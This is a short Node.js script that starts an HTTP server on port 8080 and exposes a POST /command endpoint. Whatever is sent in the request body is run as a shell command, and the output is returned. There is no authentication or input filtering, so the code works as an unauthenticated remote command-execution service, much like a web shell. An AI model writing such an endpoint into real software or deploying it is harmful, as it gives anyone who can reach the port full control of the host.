const http = require('http');
const { spawn } = require('child_process');
const cl=console.log

http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/command') {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });
    req.on('end', () => {
      const command = body.trim();
      const child = spawn(command, [], { shell: true });
      let output = '';
      child.stdout.on('data', (data) => {
        output += data;
      });
      child.stderr.on('data', (data) => {
        output += data;
      });
      child.on('close', (code) => {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.write(output);
        res.end();
        console.log("GOT IT")
      });
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.write('Not Found');
    res.end();
  }
}).listen(8080);

console.log('Server running at http://localhost:8080/');

